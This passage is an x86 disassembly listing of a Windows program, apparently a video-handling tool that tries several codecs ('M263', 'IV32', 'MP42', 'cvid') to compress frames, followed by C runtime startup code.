  40a20b:	57                   	push   %edi
  40a20c:	e8 0f fc ff ff       	call   0x409e20
  40a211:	8b f0                	mov    %eax,%esi
  40a213:	8b 43 14             	mov    0x14(%ebx),%eax
  40a216:	8b 48 08             	mov    0x8(%eax),%ecx
  40a219:	8b 41 14             	mov    0x14(%ecx),%eax
  40a21c:	83 c0 06             	add    $0x6,%eax
  40a21f:	50                   	push   %eax
  40a220:	e8 bb 04 00 00       	call   0x40a6e0
  40a225:	8b e8                	mov    %eax,%ebp
  40a227:	83 c4 04             	add    $0x4,%esp
  40a22a:	85 ed                	test   %ebp,%ebp
  40a22c:	0f 84 e6 00 00 00    	je     0x40a318
  40a232:	c6 45 00 78          	movb   $0x78,0x0(%ebp)
  40a236:	8a 53 28             	mov    0x28(%ebx),%dl
  40a239:	88 55 01             	mov    %dl,0x1(%ebp)
  40a23c:	8b 43 1c             	mov    0x1c(%ebx),%eax
  40a23f:	89 45 02             	mov    %eax,0x2(%ebp)
  40a242:	8a 43 28             	mov    0x28(%ebx),%al
  40a245:	84 c0                	test   %al,%al
  40a247:	0f 84 93 00 00 00    	je     0x40a2e0
  40a24d:	8b 43 18             	mov    0x18(%ebx),%eax
  40a250:	85 c0                	test   %eax,%eax
  40a252:	0f 84 88 00 00 00    	je     0x40a2e0
  40a258:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a25d:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40a264:	00 
  40a265:	85 f6                	test   %esi,%esi
  40a267:	8d 7d 06             	lea    0x6(%ebp),%edi
  40a26a:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  40a26e:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  40a272:	0f 84 a0 00 00 00    	je     0x40a318
  40a278:	85 ff                	test   %edi,%edi
  40a27a:	0f 84 98 00 00 00    	je     0x40a318
  40a280:	8b 53 14             	mov    0x14(%ebx),%edx
  40a283:	8b 48 48             	mov    0x48(%eax),%ecx
  40a286:	8b 52 08             	mov    0x8(%edx),%edx
  40a289:	8b 52 14             	mov    0x14(%edx),%edx
  40a28c:	3b 51 14             	cmp    0x14(%ecx),%edx
  40a28f:	0f 85 83 00 00 00    	jne    0x40a318
  40a295:	8b 48 44             	mov    0x44(%eax),%ecx
  40a298:	85 c9                	test   %ecx,%ecx
  40a29a:	74 7c                	je     0x40a318
  40a29c:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40a2a0:	8d 54 24 18          	lea    0x18(%esp),%edx
  40a2a4:	51                   	push   %ecx
  40a2a5:	52                   	push   %edx
  40a2a6:	56                   	push   %esi
  40a2a7:	83 c0 04             	add    $0x4,%eax
  40a2aa:	6a 00                	push   $0x0
  40a2ac:	50                   	push   %eax
  40a2ad:	e8 aa 06 00 00       	call   0x40a95c
  40a2b2:	85 c0                	test   %eax,%eax
  40a2b4:	74 62                	je     0x40a318
  40a2b6:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40a2ba:	85 c9                	test   %ecx,%ecx
  40a2bc:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40a2c0:	74 04                	je     0x40a2c6
  40a2c2:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40a2c6:	8b d1                	mov    %ecx,%edx
  40a2c8:	8b f0                	mov    %eax,%esi
  40a2ca:	c1 e9 02             	shr    $0x2,%ecx
  40a2cd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40a2cf:	8b 44 24 10          	mov    0x10(%esp),%eax
  40a2d3:	8b ca                	mov    %edx,%ecx
  40a2d5:	83 e1 03             	and    $0x3,%ecx
  40a2d8:	85 c0                	test   %eax,%eax
  40a2da:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40a2dc:	74 3a                	je     0x40a318
  40a2de:	eb 23                	jmp    0x40a303
  40a2e0:	8b 43 14             	mov    0x14(%ebx),%eax
  40a2e3:	8d 7d 06             	lea    0x6(%ebp),%edi
  40a2e6:	8b 48 08             	mov    0x8(%eax),%ecx
  40a2e9:	8b 49 14             	mov    0x14(%ecx),%ecx
  40a2ec:	8b d1                	mov    %ecx,%edx
  40a2ee:	c1 e9 02             	shr    $0x2,%ecx
  40a2f1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40a2f3:	8b ca                	mov    %edx,%ecx
  40a2f5:	83 e1 03             	and    $0x3,%ecx
  40a2f8:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40a2fa:	8b 43 14             	mov    0x14(%ebx),%eax
  40a2fd:	8b 48 08             	mov    0x8(%eax),%ecx
  40a300:	8b 41 14             	mov    0x14(%ecx),%eax
  40a303:	83 c0 06             	add    $0x6,%eax
  40a306:	8b cb                	mov    %ebx,%ecx
  40a308:	50                   	push   %eax
  40a309:	55                   	push   %ebp
  40a30a:	e8 91 bc ff ff       	call   0x405fa0
  40a30f:	55                   	push   %ebp
  40a310:	e8 d1 03 00 00       	call   0x40a6e6
  40a315:	83 c4 04             	add    $0x4,%esp
  40a318:	5f                   	pop    %edi
  40a319:	5e                   	pop    %esi
  40a31a:	5d                   	pop    %ebp
  40a31b:	5b                   	pop    %ebx
  40a31c:	83 c4 0c             	add    $0xc,%esp
  40a31f:	c3                   	ret
  40a320:	53                   	push   %ebx
  40a321:	8b 1d bc b0 40 00    	mov    0x40b0bc,%ebx
  40a327:	56                   	push   %esi
  40a328:	8b f1                	mov    %ecx,%esi
  40a32a:	57                   	push   %edi
  40a32b:	6a 00                	push   $0x0
  40a32d:	8d 7e 10             	lea    0x10(%esi),%edi
  40a330:	57                   	push   %edi
  40a331:	ff d3                	call   *%ebx
  40a333:	8b 46 2c             	mov    0x2c(%esi),%eax
  40a336:	6a ff                	push   $0xffffffff
  40a338:	50                   	push   %eax
  40a339:	ff 15 dc b1 40 00    	call   *0x40b1dc
  40a33f:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40a343:	8b 54 24 14          	mov    0x14(%esp),%edx
  40a347:	6a 01                	push   $0x1
  40a349:	57                   	push   %edi
  40a34a:	89 4e 20             	mov    %ecx,0x20(%esi)
  40a34d:	89 56 24             	mov    %edx,0x24(%esi)
  40a350:	ff d3                	call   *%ebx
  40a352:	6a 01                	push   $0x1
  40a354:	6a 00                	push   $0x0
  40a356:	6a 00                	push   $0x0
  40a358:	56                   	push   %esi
  40a359:	68 80 a3 40 00       	push   $0x40a380
  40a35e:	6a 00                	push   $0x0
  40a360:	6a 00                	push   $0x0
  40a362:	e8 09 f2 ff ff       	call   0x409570
  40a367:	83 c4 1c             	add    $0x1c,%esp
  40a36a:	89 46 2c             	mov    %eax,0x2c(%esi)
  40a36d:	5f                   	pop    %edi
  40a36e:	5e                   	pop    %esi
  40a36f:	5b                   	pop    %ebx
  40a370:	c2 08 00             	ret    $0x8
  40a373:	90                   	nop
  40a374:	90                   	nop
  40a375:	90                   	nop
  40a376:	90                   	nop
  40a377:	90                   	nop
  40a378:	90                   	nop
  40a379:	90                   	nop
  40a37a:	90                   	nop
  40a37b:	90                   	nop
  40a37c:	90                   	nop
  40a37d:	90                   	nop
  40a37e:	90                   	nop
  40a37f:	90                   	nop
  40a380:	8a 0d 70 e9 40 00    	mov    0x40e970,%cl
  40a386:	b0 01                	mov    $0x1,%al
  40a388:	56                   	push   %esi
  40a389:	57                   	push   %edi
  40a38a:	8b 3d 7c b1 40 00    	mov    0x40b17c,%edi
  40a390:	84 c8                	test   %cl,%al
  40a392:	75 0f                	jne    0x40a3a3
  40a394:	0a c8                	or     %al,%cl
  40a396:	88 0d 70 e9 40 00    	mov    %cl,0x40e970
  40a39c:	ff d7                	call   *%edi
  40a39e:	a3 74 e9 40 00       	mov    %eax,0x40e974
  40a3a3:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40a3a7:	8b ce                	mov    %esi,%ecx
  40a3a9:	e8 72 00 00 00       	call   0x40a420
  40a3ae:	84 c0                	test   %al,%al
  40a3b0:	8b ce                	mov    %esi,%ecx
  40a3b2:	75 15                	jne    0x40a3c9
  40a3b4:	e8 f7 02 00 00       	call   0x40a6b0
  40a3b9:	8b 4e 04             	mov    0x4(%esi),%ecx
  40a3bc:	e8 af 7d ff ff       	call   0x402170
  40a3c1:	5f                   	pop    %edi
  40a3c2:	83 c8 ff             	or     $0xffffffff,%eax
  40a3c5:	5e                   	pop    %esi
  40a3c6:	c2 04 00             	ret    $0x4
  40a3c9:	e8 e2 fd ff ff       	call   0x40a1b0
  40a3ce:	8b ce                	mov    %esi,%ecx
  40a3d0:	e8 3b bc ff ff       	call   0x406010
  40a3d5:	8a 46 10             	mov    0x10(%esi),%al
  40a3d8:	84 c0                	test   %al,%al
  40a3da:	74 30                	je     0x40a40c
  40a3dc:	53                   	push   %ebx
  40a3dd:	8b 1d c4 b0 40 00    	mov    0x40b0c4,%ebx
  40a3e3:	ff d7                	call   *%edi
  40a3e5:	2b 05 74 e9 40 00    	sub    0x40e974,%eax
  40a3eb:	3d 96 00 00 00       	cmp    $0x96,%eax
  40a3f0:	73 04                	jae    0x40a3f6
  40a3f2:	6a 64                	push   $0x64
  40a3f4:	ff d3                	call   *%ebx
  40a3f6:	ff d7                	call   *%edi
  40a3f8:	8b ce                	mov    %esi,%ecx
  40a3fa:	a3 74 e9 40 00       	mov    %eax,0x40e974
  40a3ff:	e8 fc fd ff ff       	call   0x40a200
  40a404:	8a 46 10             	mov    0x10(%esi),%al
  40a407:	84 c0                	test   %al,%al
  40a409:	75 d8                	jne    0x40a3e3
  40a40b:	5b                   	pop    %ebx
  40a40c:	8b ce                	mov    %esi,%ecx
  40a40e:	e8 9d 02 00 00       	call   0x40a6b0
  40a413:	5f                   	pop    %edi
  40a414:	33 c0                	xor    %eax,%eax
  40a416:	5e                   	pop    %esi
  40a417:	c2 04 00             	ret    $0x4
  40a41a:	90                   	nop
  40a41b:	90                   	nop
  40a41c:	90                   	nop
  40a41d:	90                   	nop
  40a41e:	90                   	nop
  40a41f:	90                   	nop
  40a420:	6a ff                	push   $0xffffffff
  40a422:	68 db ad 40 00       	push   $0x40addb
  40a427:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40a42d:	50                   	push   %eax
  40a42e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40a435:	83 ec 1c             	sub    $0x1c,%esp
  40a438:	55                   	push   %ebp
  40a439:	57                   	push   %edi
  40a43a:	8b f9                	mov    %ecx,%edi
  40a43c:	89 7c 24 10          	mov    %edi,0x10(%esp)
  40a440:	e8 8b f9 ff ff       	call   0x409dd0
  40a445:	84 c0                	test   %al,%al
  40a447:	75 11                	jne    0x40a45a
  40a449:	5f                   	pop    %edi
  40a44a:	5d                   	pop    %ebp
  40a44b:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40a44f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40a456:	83 c4 28             	add    $0x28,%esp
  40a459:	c3                   	ret
  40a45a:	6a 18                	push   $0x18
  40a45c:	e8 7f 02 00 00       	call   0x40a6e0
  40a461:	83 c4 04             	add    $0x4,%esp
  40a464:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40a468:	33 ed                	xor    %ebp,%ebp
  40a46a:	3b c5                	cmp    %ebp,%eax
  40a46c:	89 6c 24 2c          	mov    %ebp,0x2c(%esp)
  40a470:	74 0b                	je     0x40a47d
  40a472:	8b c8                	mov    %eax,%ecx
  40a474:	e8 67 f7 ff ff       	call   0x409be0
  40a479:	8b c8                	mov    %eax,%ecx
  40a47b:	eb 02                	jmp    0x40a47f
  40a47d:	33 c9                	xor    %ecx,%ecx
  40a47f:	8b 47 20             	mov    0x20(%edi),%eax
  40a482:	c7 44 24 2c ff ff ff 	movl   $0xffffffff,0x2c(%esp)
  40a489:	ff 
  40a48a:	3b c5                	cmp    %ebp,%eax
  40a48c:	89 4f 14             	mov    %ecx,0x14(%edi)
  40a48f:	74 0b                	je     0x40a49c
  40a491:	8b 57 24             	mov    0x24(%edi),%edx
  40a494:	3b d5                	cmp    %ebp,%edx
  40a496:	74 04                	je     0x40a49c
  40a498:	52                   	push   %edx
  40a499:	50                   	push   %eax
  40a49a:	eb 36                	jmp    0x40a4d2
  40a49c:	68 20 01 00 00       	push   $0x120
  40a4a1:	68 60 01 00 00       	push   $0x160
  40a4a6:	e8 b5 f9 ff ff       	call   0x409e60
  40a4ab:	84 c0                	test   %al,%al
  40a4ad:	88 44 24 0b          	mov    %al,0xb(%esp)
  40a4b1:	75 3f                	jne    0x40a4f2
  40a4b3:	8b 4f 14             	mov    0x14(%edi),%ecx
  40a4b6:	68 90 00 00 00       	push   $0x90
  40a4bb:	68 b0 00 00 00       	push   $0xb0
  40a4c0:	e8 9b f9 ff ff       	call   0x409e60
  40a4c5:	84 c0                	test   %al,%al
  40a4c7:	88 44 24 0b          	mov    %al,0xb(%esp)
  40a4cb:	75 25                	jne    0x40a4f2
  40a4cd:	8b 4f 14             	mov    0x14(%edi),%ecx
  40a4d0:	55                   	push   %ebp
  40a4d1:	55                   	push   %ebp
  40a4d2:	e8 89 f9 ff ff       	call   0x409e60
  40a4d7:	84 c0                	test   %al,%al
  40a4d9:	88 44 24 0b          	mov    %al,0xb(%esp)
  40a4dd:	75 13                	jne    0x40a4f2
  40a4df:	5f                   	pop    %edi
  40a4e0:	32 c0                	xor    %al,%al
  40a4e2:	5d                   	pop    %ebp
  40a4e3:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40a4e7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40a4ee:	83 c4 28             	add    $0x28,%esp
  40a4f1:	c3                   	ret
  40a4f2:	53                   	push   %ebx
  40a4f3:	56                   	push   %esi
  40a4f4:	c7 44 24 1c 4d 32 36 	movl   $0x3336324d,0x1c(%esp)
  40a4fb:	33 
  40a4fc:	c7 44 24 20 49 56 33 	movl   $0x32335649,0x20(%esp)
  40a503:	32 
  40a504:	c7 44 24 24 4d 50 34 	movl   $0x3234504d,0x24(%esp)
  40a50b:	32 
  40a50c:	c7 44 24 28 63 76 69 	movl   $0x64697663,0x28(%esp)
  40a513:	64 
  40a514:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  40a518:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  40a51c:	6a 78                	push   $0x78
  40a51e:	e8 bd 01 00 00       	call   0x40a6e0
  40a523:	83 c4 04             	add    $0x4,%esp
  40a526:	3b c5                	cmp    %ebp,%eax
  40a528:	74 0d                	je     0x40a537
  40a52a:	c7 00 08 b5 40 00    	movl   $0x40b508,(%eax)
  40a530:	89 68 48             	mov    %ebp,0x48(%eax)
  40a533:	8b f0                	mov    %eax,%esi
  40a535:	eb 02                	jmp    0x40a539
  40a537:	33 f6                	xor    %esi,%esi
  40a539:	8b 47 14             	mov    0x14(%edi),%eax
  40a53c:	89 77 18             	mov    %esi,0x18(%edi)
  40a53f:	8b 40 08             	mov    0x8(%eax),%eax
  40a542:	3b c5                	cmp    %ebp,%eax
  40a544:	0f 84 aa 00 00 00    	je     0x40a5f4
  40a54a:	8d 6e 04             	lea    0x4(%esi),%ebp
  40a54d:	89 46 48             	mov    %eax,0x48(%esi)
  40a550:	b9 10 00 00 00       	mov    $0x10,%ecx
  40a555:	33 c0                	xor    %eax,%eax
  40a557:	8b fd                	mov    %ebp,%edi
  40a559:	6a 03                	push   $0x3
  40a55b:	f3 ab                	rep stos %eax,%es:(%edi)
  40a55d:	8b 03                	mov    (%ebx),%eax
  40a55f:	8b 4e 44             	mov    0x44(%esi),%ecx
  40a562:	bf 01 00 00 00       	mov    $0x1,%edi
  40a567:	50                   	push   %eax
  40a568:	68 76 69 64 63       	push   $0x63646976
  40a56d:	c7 45 00 40 00 00 00 	movl   $0x40,0x0(%ebp)
  40a574:	89 7e 08             	mov    %edi,0x8(%esi)
  40a577:	89 4e 0c             	mov    %ecx,0xc(%esi)
  40a57a:	c7 46 10 76 69 64 63 	movl   $0x63646976,0x10(%esi)
  40a581:	89 46 14             	mov    %eax,0x14(%esi)
  40a584:	c7 46 1c 00 00 00 00 	movl   $0x0,0x1c(%esi)
  40a58b:	c7 46 2c 0a 00 00 00 	movl   $0xa,0x2c(%esi)
  40a592:	c7 46 30 06 00 00 00 	movl   $0x6,0x30(%esi)
  40a599:	c7 46 34 10 27 00 00 	movl   $0x2710,0x34(%esi)
  40a5a0:	e8 c9 03 00 00       	call   0x40a96e
  40a5a5:	85 c0                	test   %eax,%eax
  40a5a7:	89 46 44             	mov    %eax,0x44(%esi)
  40a5aa:	74 42                	je     0x40a5ee
  40a5ac:	8b 4e 48             	mov    0x48(%esi),%ecx
  40a5af:	8d 56 4c             	lea    0x4c(%esi),%edx
  40a5b2:	52                   	push   %edx
  40a5b3:	51                   	push   %ecx
  40a5b4:	68 04 40 00 00       	push   $0x4004
  40a5b9:	50                   	push   %eax
  40a5ba:	e8 a9 03 00 00       	call   0x40a968
  40a5bf:	8b 56 44             	mov    0x44(%esi),%edx
  40a5c2:	68 a2 ae de ac       	push   $0xacdeaea2
  40a5c7:	68 ce 9a 32 f7       	push   $0xf7329ace
  40a5cc:	68 c9 60 00 00       	push   $0x60c9
  40a5d1:	52                   	push   %edx
  40a5d2:	e8 91 03 00 00       	call   0x40a968
  40a5d7:	8b 4e 48             	mov    0x48(%esi),%ecx
  40a5da:	8b 46 44             	mov    0x44(%esi),%eax
  40a5dd:	51                   	push   %ecx
  40a5de:	55                   	push   %ebp
  40a5df:	89 46 0c             	mov    %eax,0xc(%esi)
  40a5e2:	89 7e 08             	mov    %edi,0x8(%esi)
  40a5e5:	e8 78 03 00 00       	call   0x40a962
  40a5ea:	85 c0                	test   %eax,%eax
  40a5ec:	75 2c                	jne    0x40a61a
  40a5ee:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40a5f2:	33 ed                	xor    %ebp,%ebp
  40a5f4:	8b 4f 18             	mov    0x18(%edi),%ecx
  40a5f7:	3b cd                	cmp    %ebp,%ecx
  40a5f9:	74 06                	je     0x40a601
  40a5fb:	8b 11                	mov    (%ecx),%edx
  40a5fd:	6a 01                	push   $0x1
  40a5ff:	ff 12                	call   *(%edx)
  40a601:	8b 44 24 14          	mov    0x14(%esp),%eax
  40a605:	83 c3 04             	add    $0x4,%ebx
  40a608:	40                   	inc    %eax
  40a609:	89 6f 18             	mov    %ebp,0x18(%edi)
  40a60c:	83 f8 04             	cmp    $0x4,%eax
  40a60f:	89 44 24 14          	mov    %eax,0x14(%esp)
  40a613:	73 2a                	jae    0x40a63f
  40a615:	e9 02 ff ff ff       	jmp    0x40a51c
  40a61a:	8b 46 48             	mov    0x48(%esi),%eax
  40a61d:	8b 56 44             	mov    0x44(%esi),%edx
  40a620:	8d 4e 4c             	lea    0x4c(%esi),%ecx
  40a623:	50                   	push   %eax
  40a624:	51                   	push   %ecx
  40a625:	68 0c 40 00 00       	push   $0x400c
  40a62a:	52                   	push   %edx
  40a62b:	e8 38 03 00 00       	call   0x40a968
  40a630:	8b 44 24 14          	mov    0x14(%esp),%eax
  40a634:	8b 54 24 18          	mov    0x18(%esp),%edx
  40a638:	8b 4c 84 1c          	mov    0x1c(%esp,%eax,4),%ecx
  40a63c:	89 4a 1c             	mov    %ecx,0x1c(%edx)
  40a63f:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  40a643:	8a 44 24 13          	mov    0x13(%esp),%al
  40a647:	5e                   	pop    %esi
  40a648:	5b                   	pop    %ebx
  40a649:	5f                   	pop    %edi
  40a64a:	5d                   	pop    %ebp
  40a64b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40a652:	83 c4 28             	add    $0x28,%esp
  40a655:	c3                   	ret
  40a656:	90                   	nop
  40a657:	90                   	nop
  40a658:	90                   	nop
  40a659:	90                   	nop
  40a65a:	90                   	nop
  40a65b:	90                   	nop
  40a65c:	90                   	nop
  40a65d:	90                   	nop
  40a65e:	90                   	nop
  40a65f:	90                   	nop
  40a660:	56                   	push   %esi
  40a661:	8b f1                	mov    %ecx,%esi
  40a663:	8b 46 44             	mov    0x44(%esi),%eax
  40a666:	c7 06 08 b5 40 00    	movl   $0x40b508,(%esi)
  40a66c:	85 c0                	test   %eax,%eax
  40a66e:	74 29                	je     0x40a699
  40a670:	57                   	push   %edi
  40a671:	6a 00                	push   $0x0
  40a673:	6a 00                	push   $0x0
  40a675:	68 0e 40 00 00       	push   $0x400e
  40a67a:	50                   	push   %eax
  40a67b:	e8 e8 02 00 00       	call   0x40a968
  40a680:	8d 7e 04             	lea    0x4(%esi),%edi
  40a683:	57                   	push   %edi
  40a684:	e8 f7 02 00 00       	call   0x40a980
  40a689:	57                   	push   %edi
  40a68a:	e8 eb 02 00 00       	call   0x40a97a
  40a68f:	8b 46 44             	mov    0x44(%esi),%eax
  40a692:	50                   	push   %eax
  40a693:	e8 dc 02 00 00       	call   0x40a974
  40a698:	5f                   	pop    %edi
  40a699:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40a69e:	74 09                	je     0x40a6a9
  40a6a0:	56                   	push   %esi
  40a6a1:	e8 40 00 00 00       	call   0x40a6e6
  40a6a6:	83 c4 04             	add    $0x4,%esp
  40a6a9:	8b c6                	mov    %esi,%eax
  40a6ab:	5e                   	pop    %esi
  40a6ac:	c2 04 00             	ret    $0x4
  40a6af:	90                   	nop
  40a6b0:	56                   	push   %esi
  40a6b1:	8b f1                	mov    %ecx,%esi
  40a6b3:	8b 4e 14             	mov    0x14(%esi),%ecx
  40a6b6:	85 c9                	test   %ecx,%ecx
  40a6b8:	74 0d                	je     0x40a6c7
  40a6ba:	8b 01                	mov    (%ecx),%eax
  40a6bc:	6a 01                	push   $0x1
  40a6be:	ff 10                	call   *(%eax)
  40a6c0:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  40a6c7:	8b 4e 18             	mov    0x18(%esi),%ecx
  40a6ca:	85 c9                	test   %ecx,%ecx
  40a6cc:	74 0d                	je     0x40a6db
  40a6ce:	8b 11                	mov    (%ecx),%edx
  40a6d0:	6a 01                	push   $0x1
  40a6d2:	ff 12                	call   *(%edx)
  40a6d4:	c7 46 18 00 00 00 00 	movl   $0x0,0x18(%esi)
  40a6db:	5e                   	pop    %esi
  40a6dc:	c3                   	ret
  40a6dd:	90                   	nop
  40a6de:	90                   	nop
  40a6df:	90                   	nop
  40a6e0:	ff 25 38 b2 40 00    	jmp    *0x40b238
  40a6e6:	ff 25 3c b2 40 00    	jmp    *0x40b23c
  40a6ec:	ff 25 40 b2 40 00    	jmp    *0x40b240
  40a6f2:	cc                   	int3
  40a6f3:	cc                   	int3
  40a6f4:	cc                   	int3
  40a6f5:	cc                   	int3
  40a6f6:	cc                   	int3
  40a6f7:	cc                   	int3
  40a6f8:	cc                   	int3
  40a6f9:	cc                   	int3
  40a6fa:	cc                   	int3
  40a6fb:	cc                   	int3
  40a6fc:	cc                   	int3
  40a6fd:	cc                   	int3
  40a6fe:	cc                   	int3
  40a6ff:	cc                   	int3
  40a700:	ff 25 4c b2 40 00    	jmp    *0x40b24c
  40a706:	cc                   	int3
  40a707:	cc                   	int3
  40a708:	cc                   	int3
  40a709:	cc                   	int3
  40a70a:	cc                   	int3
  40a70b:	cc                   	int3
  40a70c:	cc                   	int3
  40a70d:	cc                   	int3
  40a70e:	cc                   	int3
  40a70f:	cc                   	int3
  40a710:	51                   	push   %ecx
  40a711:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40a716:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40a71a:	72 14                	jb     0x40a730
  40a71c:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  40a722:	2d 00 10 00 00       	sub    $0x1000,%eax
  40a727:	85 01                	test   %eax,(%ecx)
  40a729:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40a72e:	73 ec                	jae    0x40a71c
  40a730:	2b c8                	sub    %eax,%ecx
  40a732:	8b c4                	mov    %esp,%eax
  40a734:	85 01                	test   %eax,(%ecx)
  40a736:	8b e1                	mov    %ecx,%esp
  40a738:	8b 08                	mov    (%eax),%ecx
  40a73a:	8b 40 04             	mov    0x4(%eax),%eax
  40a73d:	50                   	push   %eax
  40a73e:	c3                   	ret
  40a73f:	56                   	push   %esi
  40a740:	8b f1                	mov    %ecx,%esi
  40a742:	e8 a7 01 00 00       	call   0x40a8ee
  40a747:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40a74c:	74 07                	je     0x40a755
  40a74e:	56                   	push   %esi
  40a74f:	e8 92 ff ff ff       	call   0x40a6e6
  40a754:	59                   	pop    %ecx
  40a755:	8b c6                	mov    %esi,%eax
  40a757:	5e                   	pop    %esi
  40a758:	c2 04 00             	ret    $0x4
  40a75b:	cc                   	int3
  40a75c:	ff 25 54 b2 40 00    	jmp    *0x40b254
  40a762:	ff 25 64 b2 40 00    	jmp    *0x40b264
  40a768:	cc                   	int3
  40a769:	cc                   	int3
  40a76a:	cc                   	int3
  40a76b:	cc                   	int3
  40a76c:	cc                   	int3
  40a76d:	cc                   	int3
  40a76e:	cc                   	int3
  40a76f:	cc                   	int3
  40a770:	80 f9 40             	cmp    $0x40,%cl
  40a773:	73 15                	jae    0x40a78a
  40a775:	80 f9 20             	cmp    $0x20,%cl
  40a778:	73 06                	jae    0x40a780
  40a77a:	0f ad d0             	shrd   %cl,%edx,%eax
  40a77d:	d3 ea                	shr    %cl,%edx
  40a77f:	c3                   	ret
  40a780:	8b c2                	mov    %edx,%eax
  40a782:	33 d2                	xor    %edx,%edx
  40a784:	80 e1 1f             	and    $0x1f,%cl
  40a787:	d3 e8                	shr    %cl,%eax
  40a789:	c3                   	ret
  40a78a:	33 c0                	xor    %eax,%eax
  40a78c:	33 d2                	xor    %edx,%edx
  40a78e:	c3                   	ret
  40a78f:	55                   	push   %ebp
  40a790:	8b ec                	mov    %esp,%ebp
  40a792:	6a ff                	push   $0xffffffff
  40a794:	68 18 b5 40 00       	push   $0x40b518
  40a799:	68 62 a7 40 00       	push   $0x40a762
  40a79e:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40a7a4:	50                   	push   %eax
  40a7a5:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40a7ac:	83 ec 68             	sub    $0x68,%esp
  40a7af:	53                   	push   %ebx
  40a7b0:	56                   	push   %esi
  40a7b1:	57                   	push   %edi
  40a7b2:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40a7b5:	33 db                	xor    %ebx,%ebx
  40a7b7:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40a7ba:	6a 02                	push   $0x2
  40a7bc:	ff 15 a4 b2 40 00    	call   *0x40b2a4
  40a7c2:	59                   	pop    %ecx
  40a7c3:	83 0d 8c e9 40 00 ff 	orl    $0xffffffff,0x40e98c
  40a7ca:	83 0d 90 e9 40 00 ff 	orl    $0xffffffff,0x40e990
  40a7d1:	ff 15 a0 b2 40 00    	call   *0x40b2a0
  40a7d7:	8b 0d 88 e9 40 00    	mov    0x40e988,%ecx
  40a7dd:	89 08                	mov    %ecx,(%eax)
  40a7df:	ff 15 9c b2 40 00    	call   *0x40b29c
  40a7e5:	8b 0d 84 e9 40 00    	mov    0x40e984,%ecx
  40a7eb:	89 08                	mov    %ecx,(%eax)
  40a7ed:	a1 98 b2 40 00       	mov    0x40b298,%eax
  40a7f2:	8b 00                	mov    (%eax),%eax
  40a7f4:	a3 94 e9 40 00       	mov    %eax,0x40e994
  40a7f9:	e8 17 01 00 00       	call   0x40a915
  40a7fe:	39 1d 20 e7 40 00    	cmp    %ebx,0x40e720
  40a804:	75 0c                	jne    0x40a812
  40a806:	68 12 a9 40 00       	push   $0x40a912
  40a80b:	ff 15 94 b2 40 00    	call   *0x40b294
  40a811:	59                   	pop    %ecx
  40a812:	e8 e9 00 00 00       	call   0x40a900
  40a817:	68 10 e0 40 00       	push   $0x40e010
  40a81c:	68 0c e0 40 00       	push   $0x40e00c
  40a821:	e8 d4 00 00 00       	call   0x40a8fa
  40a826:	a1 80 e9 40 00       	mov    0x40e980,%eax
  40a82b:	89 45 94             	mov    %eax,-0x6c(%ebp)
  40a82e:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40a831:	50                   	push   %eax
  40a832:	ff 35 7c e9 40 00    	push   0x40e97c
  40a838:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40a83b:	50                   	push   %eax
  40a83c:	8d 45 90             	lea    -0x70(%ebp),%eax
  40a83f:	50                   	push   %eax
  40a840:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40a843:	50                   	push   %eax
  40a844:	ff 15 8c b2 40 00    	call   *0x40b28c
  40a84a:	68 08 e0 40 00       	push   $0x40e008
  40a84f:	68 00 e0 40 00       	push   $0x40e000
  40a854:	e8 a1 00 00 00       	call   0x40a8fa
  40a859:	83 c4 24             	add    $0x24,%esp
  40a85c:	a1 88 b2 40 00       	mov    0x40b288,%eax
  40a861:	8b 30                	mov    (%eax),%esi
  40a863:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40a866:	80 3e 22             	cmpb   $0x22,(%esi)
  40a869:	75 3a                	jne    0x40a8a5
  40a86b:	46                   	inc    %esi
  40a86c:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40a86f:	8a 06                	mov    (%esi),%al
  40a871:	3a c3                	cmp    %bl,%al
  40a873:	74 04                	je     0x40a879
  40a875:	3c 22                	cmp    $0x22,%al
  40a877:	75 f2                	jne    0x40a86b
  40a879:	80 3e 22             	cmpb   $0x22,(%esi)
  40a87c:	75 04                	jne    0x40a882
  40a87e:	46                   	inc    %esi
  40a87f:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40a882:	8a 06                	mov    (%esi),%al
  40a884:	3a c3                	cmp    %bl,%al
  40a886:	74 04                	je     0x40a88c
